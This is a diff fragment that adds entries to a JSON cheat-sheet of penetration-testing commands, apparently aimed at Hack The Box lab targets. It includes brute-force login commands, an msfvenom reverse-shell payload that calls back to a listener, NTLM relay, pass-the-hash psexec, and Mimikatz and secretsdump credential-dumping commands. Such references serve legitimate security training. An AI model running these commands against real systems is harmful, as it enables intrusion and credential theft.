+      "related": [
+        247,
+        248,
+        435,
+        436,
+        437
+      ]
+    },
+    {
+      "Name": "gobuster",
+      "Category": 3,
+      "Description": "Directory busting tool",
+      "Command": "gobuster dir -u http://10.10.10.5 -w /usr/share/wfuzz/wordlist/general/megabeast.txt -o gobuster_results.txt",
+      "OS": "Linux",
+      "id": 439,
+      "related": [
+        18,
+        19,
+        20,
+        242,
+        243
+      ]
+    },
+    {
+      "Name": "ffuf",
+      "Category": 3,
+      "Description": "Directory busting with ffuf",
+      "Command": "ffuf -u http://hostmaster.ghost.htb/FUZZ -w /usr/share/wordlists/wfuzz/general/megabeast.txt -mc 200,301,302",
+      "OS": "Linux",
+      "id": 440,
+      "related": [
+        242,
+        243,
+        439,
+        441,
+        442
+      ]
+    },
+    {
+      "Name": "wfuzz",
+      "Category": 3,
+      "Description": "Directory busting with wfuzz",
+      "Command": "wfuzz -c -z file,/path/to/wordlist.txt --hc 404 http://target-site/FUZZ",
+      "OS": "Linux",
+      "id": 441,
+      "related": [
+        242,
+        243,
+        439,
+        440,
+        442
+      ]
+    },
+    {
+      "Name": "nmap",
+      "Category": 3,
+      "Description": "Scan for open ports",
+      "Command": "nmap -p- --open 10.10.10.11",
+      "OS": "Linux",
+      "id": 442,
+      "related": [
+        152,
+        153,
+        154,
+        155,
+        439
+      ]
+    },
+    {
+      "Name": "gobuster File",
+      "Category": 3,
+      "Description": "File busting with gobuster",
+      "Command": "gobuster dir -u http://target-site.com -w /path/to/wordlist.txt -x php,json",
+      "OS": "Linux",
+      "id": 443,
+      "related": [
+        439,
+        440,
+        441,
+        444,
+        445
+      ]
+    },
+    {
+      "Name": "wfuzz File",
+      "Category": 3,
+      "Description": "File busting with wfuzz",
+      "Command": "wfuzz -c -z file,/path/to/wordlist.txt --hc 404 http://target-site.com/FUZZ.{php,json}",
+      "OS": "Linux",
+      "id": 444,
+      "related": [
+        440,
+        441,
+        443,
+        445,
+        446
+      ]
+    },
+    {
+      "Name": "ffuf File",
+      "Category": 3,
+      "Description": "File busting with ffuf",
+      "Command": "ffuf -u http://target-site.com/FUZZ -w /path/to/wordlist.txt -e php,json -mc 200",
+      "OS": "Linux",
+      "id": 445,
+      "related": [
+        440,
+        441,
+        443,
+        444,
+        447
+      ]
+    },
+    {
+      "Name": "hydra",
+      "Category": 4,
+      "Description": "Brute force login attempts",
+      "Command": "hydra -l tyler -P /usr/share/wordlists/rockyou.txt 10.10.10.97 http-post-form \"/login.php:username=^USER^&password=^PASS^:F=valid\"",
+      "OS": "Linux",
+      "id": 446,
+      "related": [
+        14,
+        15,
+        74,
+        75,
+        76
+      ]
+    },
+    {
+      "Name": "ffuf Brute",
+      "Category": 4,
+      "Description": "Brute force with ffuf",
+      "Command": "ffuf -w /usr/share/wordlists/rockyou.txt:FUZZ -u \"http://10.10.11.24:8008/ghost/api/admin/session\" -X POST -d '{\"username\":\"htbuserFUZZ\",\"password\":\"secret\"}' -H \"Host: 10.10.11.24:8008\" -H \"Accept: text/plain, _/_; q=0.01\" -H \"X-Forwarded-For: htbuserFUZZ\" -H \"X-Requested-With: XMLHttpRequest\" -H \"X-Ghost-Version: 5.78\" -H \"App-Pragma: no-cache\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36\" -H \"Content-Type: application/json;charset=UTF-8\" -H \"Origin: http://10.10.11.24:8008\" -H \"Referer: http://10.10.11.24:8008/ghost/\" -H \"Accept-Encoding: gzip, deflate, br\" -H \"Accept-Language: en-US,en;q=0.9\" -H \"Cookie: connect.sid=s%3Av28_oZV8lijLRwlgUQWxt6ccnksDKouo.sb4qxncwYoE0dnj3ARiTb8OnJitRF%2FvDttKjE0nSX%2FM\" -H \"Connection: close\" -mr \"There is no user with that email address.\"",
+      "OS": "Linux",
+      "id": 447,
+      "related": [
+        440,
+        445,
+        446,
+        448,
+        449
+      ]
+    },
+    {
+      "Name": "wfuzz Brute",
+      "Category": 4,
+      "Description": "Brute force with wfuzz",
+      "Command": "wfuzz -z range,1-100000 -d \"username=htbuserFUZZ&password=secret\" -H \"X-Forwarded-For: htbuserFUZZ\" --hs \"There is no user with that email address.\" -u \"http://10.10.11.24:8008/ghost/api/admin/session\"",
+      "OS": "Linux",
+      "id": 448,
+      "related": [
+        441,
+        444,
+        446,
+        447,
+        449
+      ]
+    },
+    {
+      "Name": "nikto",
+      "Category": 5,
+      "Description": "Vulnerability scanning with nikto",
+      "Command": "nikto -h http://targetip:targetport",
+      "OS": "Linux",
+      "id": 449,
+      "related": [
+        241,
+        242,
+        243,
+        244,
+        447
+      ]
+    },
+    {
+      "Name": "nmap Vuln",
+      "Category": 5,
+      "Description": "Vulnerability scanning with nmap scripts",
+      "Command": "nmap --script-help=http* -v 10.10.10.11",
+      "OS": "Linux",
+      "id": 450,
+      "related": [
+        241,
+        243,
+        449,
+        451,
+        452
+      ]
+    },
+    {
+      "Name": "wpscan",
+      "Category": 5,
+      "Description": "WordPress security scanner",
+      "Command": "wpscan --url http://10.10.10.11/pathtowordpress/",
+      "OS": "Linux",
+      "id": 451,
+      "related": [
+        244,
+        449,
+        450,
+        452,
+        453
+      ]
+    },
+    {
+      "Name": "ffuf Subdomain",
+      "Category": 6,
+      "Description": "Subdomain enumeration with ffuf",
+      "Command": "ffuf -u http://DOMAIN -w wordlist.txt -H \"Host: FUZZ.DOMAIN\" -s",
+      "OS": "Linux",
+      "id": 452,
+      "related": [
+        245,
+        431,
+        432,
+        434,
+        453
+      ]
+    },
+    {
+      "Name": "wfuzz Subdomain",
+      "Category": 6,
+      "Description": "Subdomain enumeration with wfuzz",
+      "Command": "wfuzz -c -z file,/path/to/wordlist.txt -H \"Host: FUZZ.target-site.com\" --hw 0 http://target-site.com",
+      "OS": "Linux",
+      "id": 453,
+      "related": [
+        246,
+        431,
+        432,
+        452,
+        454
+      ]
+    },
+    {
+      "Name": "enum4linux",
+      "Category": 7,
+      "Description": "SMB enumeration",
+      "Command": "enum4linux -a 10.10.11.24",
+      "OS": "Linux",
+      "id": 454,
+      "related": [
+        136,
+        137,
+        138,
+        139,
+        140
+      ]
+    },
+    {
+      "Name": "smbclient",
+      "Category": 7,
+      "Description": "List SMB shares",
+      "Command": "smbclient -L \\\\10.10.11.24 -U anonymous",
+      "OS": "Linux",
+      "id": 455,
+      "related": [
+        144,
+        156,
+        454,
+        456,
+        457
+      ]
+    },
+    {
+      "Name": "nmap SMB",
+      "Category": 7,
+      "Description": "SMB vulnerability scan",
+      "Command": "nmap --script smb-vuln* -p 445 10.10.11.24",
+      "OS": "Linux",
+      "id": 456,
+      "related": [
+        157,
+        454,
+        455,
+        457,
+        458
+      ]
+    },
+    {
+      "Name": "smbmap",
+      "Category": 7,
+      "Description": "SMB share mapping",
+      "Command": "smbmap -H 10.10.11.24 -u guest -p \"\"",
+      "OS": "Linux",
+      "id": 457,
+      "related": [
+        158,
+        454,
+        455,
+        456,
+        458
+      ]
+    },
+    {
+      "Name": "medusa SMB",
+      "Category": 7,
+      "Description": "Brute force SMB with medusa",
+      "Command": "medusa -h 10.10.11.24 -u administrator -P /usr/share/wordlists/rockyou.txt -M smbnt -F",
+      "OS": "Linux",
+      "id": 458,
+      "related": [
+        159,
+        456,
+        457,
+        459,
+        460
+      ]
+    },
+    {
+      "Name": "hydra SMB",
+      "Category": 7,
+      "Description": "Brute force SMB with hydra",
+      "Command": "hydra -L /usr/share/wordlists/usernames.txt -P /usr/share/wordlists/rockyou.txt 10.10.11.24 smb",
+      "OS": "Linux",
+      "id": 459,
+      "related": [
+        160,
+        456,
+        457,
+        458,
+        460
+      ]
+    },
+    {
+      "Name": "ncrack SMB",
+      "Category": 7,
+      "Description": "Brute force SMB with ncrack",
+      "Command": "ncrack -p 445 -u blake -P /usr/share/wordlists/rockyou.txt smb://10.10.11.16",
+      "OS": "Linux",
+      "id": 460,
+      "related": [
+        161,
+        458,
+        459,
+        461,
+        462
+      ]
+    },
+    {
+      "Name": "nmap RPC",
+      "Category": 7,
+      "Description": "RPC enumeration with nmap",
+      "Command": "nmap -sS -sV -p 135,139,445 --script=rpc-enum* 10.10.11.2",
+      "OS": "Linux",
+      "id": 461,
+      "related": [
+        162,
+        460,
+        462,
+        463,
+        464
+      ]
+    },
+    {
+      "Name": "rpcclient",
+      "Category": 7,
+      "Description": "RPC client enumeration",
+      "Command": "rpcclient -U \"\" 10.10.11.24",
+      "OS": "Linux",
+      "id": 462,
+      "related": [
+        163,
+        461,
+        463,
+        464,
+        465
+      ]
+    },
+    {
+      "Name": "smtp-user-enum",
+      "Category": 7,
+      "Description": "SMTP user enumeration",
+      "Command": "smtp-user-enum -M VRFY -U /usr/share/wordlists/rockyou.txt -t 10.10.11.14",
+      "OS": "Linux",
+      "id": 463,
+      "related": [
+        164,
+        461,
+        462,
+        464,
+        465
+      ]
+    },
+    {
+      "Name": "medusa SMTP",
+      "Category": 7,
+      "Description": "Brute force SMTP with medusa",
+      "Command": "medusa -h target-server -u username -P /path/to/passwords.txt -M smtp -n 25",
+      "OS": "Linux",
+      "id": 464,
+      "related": [
+        165,
+        463,
+        465,
+        466,
+        467
+      ]
+    },
+    {
+      "Name": "dig",
+      "Category": 7,
+      "Description": "DNS record lookup",
+      "Command": "dig <domain> -t any",
+      "OS": "Linux",
+      "id": 465,
+      "related": [
+        166,
+        463,
+        464,
+        466,
+        467
+      ]
+    },
+    {
+      "Name": "msfvenom Windows",
+      "Category": 8,
+      "Description": "Generate Windows reverse shell payload",
+      "Command": "msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.15 LPORT=443 -f aspx -o rshell443.aspx",
+      "OS": "Linux",
+      "id": 466,
+      "related": [
+        250,
+        251,
+        252,
+        253,
+        254
+      ]
+    },
+    {
+      "Name": "chisel",
+      "Category": 9,
+      "Description": "Port forwarding with chisel",
+      "Command": "chisel server --port $PORT --proxy http://example.com",
+      "OS": "Linux",
+      "id": 467,
+      "related": [
+        122,
+        167,
+        179,
+        180,
+        181
+      ]
+    },
+    {
+      "Name": "Display System Information",
+      "Category": 17,
+      "Description": "Display windows system information",
+      "Command": "systeminfo",
+      "OS": "Windows",
+      "id": 481,
+      "related": [
+        229,
+        319,
+        320,
+        329,
+        375
+      ]
+    },
+    {
+      "Name": "Dump Hashes Secretsdump",
+      "Category": 9,
+      "Description": "Dump hashes from sam and system files",
+      "Command": "impacket-secretsdump -sam sam -system system local",
+      "OS": "Linux",
+      "id": 482,
+      "related": [
+        0,
+        1,
+        2,
+        220,
+        265
+      ]
+    },
+    {
+      "Name": "Execute NTLM Relay",
+      "Category": 9,
+      "Description": "Execute ntlm smb relay attack",
+      "Command": "sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.169.214.212 -c 'your windows command'",
+      "OS": "Linux",
+      "id": 483,
+      "related": [
+        12,
+        13,
+        14,
+        328,
+        329
+      ]
+    },
+    {
+      "Name": "Execute PsExec Hash",
+      "Category": 9,
+      "Description": "Execute psexec on remote machine using NTLM hash Mimikatz",
+      "Command": "impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b administrator@192.169.214.213",
+      "OS": "Linux",
+      "id": 484,
+      "related": [
+        1,
+        2,
+        13,
+        14,
+        265
+      ]
+    },
+    {
+      "Name": "Elevate System Token Mimikatz",
+      "Category": 16,
+      "Description": "Elevate to SYSTEM user privileges",
+      "Command": "token::elevate",
+      "OS": "Windows",
+      "id": 485,
+      "related": [
+        1,
+        5,
+        6,
+        7,
+        308
+      ]
+    },
+    {
+      "Name": "Enable Debug Privilege Mimikatz",
+      "Category": 16,
+      "Description": "Enable SeDebugPrivilege access right",
+      "Command": "privilege::debug",
+      "OS": "Windows",
+      "id": 486,
+      "related": [
+        1,
+        5,
+        6,
+        7,
+        485
+      ]
+    },
+    {
+      "Name": "Dump SAM Hashes Mimikatz",
+      "Category": 16,
+      "Description": "Extract the NTLM hashes from the SAM",
+      "Command": "lsadump::sam",
+      "OS": "Windows",
+      "id": 487,
+      "related": [
+        1,
+        2,
+        265,
+        266,
+        485
+      ]
+    },
+    {
+      "Name": "Extract Logon Passwords Mimikatz",
+      "Category": 16,
+      "Description": "Attempts to extract plaintext passwords and password hashes from all available sources",
+      "Command": "sekurlsa::logonpasswords",
+      "OS": "Windows",
+      "id": 488,
+      "related": [
+        1,
+        2,
+        5,
+        7,
+        265
+      ]
+    },
+    {
+      "Name": "List Local Users Powershell",
+      "Category": 15,
+      "Description": "Get Local Users on Windows Powershell",
+      "Command": "Get-LocalUser",
+      "OS": "Windows",
+      "id": 489,
+      "related": [
+        316,
+        319,
+        320,
+        231,
+        230
+      ]
+    },
+    {
+      "Name": "Get Computer Information Powershell",
+      "Category": 15,
+      "Description": "Get Computer Info on Windows",
+      "Command": "Get-ComputerInfo",
+      "OS": "Windows",
+      "id": 490,
+      "related": [
+        229,
+        319,
+        320,
+        481,
+        375
+      ]
+    },
+    {
+      "Name": "List Local Groups Powershell",
+      "Category": 15,
+      "Description": "Get Group Info on Windows",
+      "Command": "Get-LocalGroup",
+      "OS": "Windows",
+      "id": 491,
+      "related": [
+        316,
+        319,
+        231,
+        230,
+        489
+      ]
+    },
+    {
+      "Name": "List Group Members Powershell",
+      "Category": 15,
+      "Description": "Get Group Member Info on Windows",
+      "Command": "Get-LocalGroupMember 'Group Name'",
+      "OS": "Windows",
+      "id": 492,
+      "related": [
+        316,
+        319,
+        231,
+        230,
+        491
+      ]
+    },
+    {
+      "Name": "List 32bit Applications Powershell",
+      "Category": 15,
+      "Description": "List all installed 32bit applications",
+      "Command": "Get-ItemProperty 'HKLM:\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*' | select displayname",
+      "OS": "Windows",
+      "id": 493,
+      "related": [
+        494,
+        230,
+        231,
+        319,
+        320
+      ]
+    },
+    {
+      "Name": "List 64bit Applications Powershell",
+      "Category": 15,
+      "Description": "List all installed 64bit applications",
+      "Command": "Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*' | select displayname",
+      "OS": "Windows",
+      "id": 494,
+      "related": [
+        493,
+        230,
+        231,
+        319,
+        320
+      ]
+    },
+    {
+      "Name": "List Running Processes Powershell",
+      "Category": 15,
+      "Description": "List all running processes",
+      "Command": "Get-Process",
+      "OS": "Windows",
+      "id": 495,
+      "related": [
+        231,
+        230,
+        315,
+        321,
+        124
+      ]
     }
   ]
 }
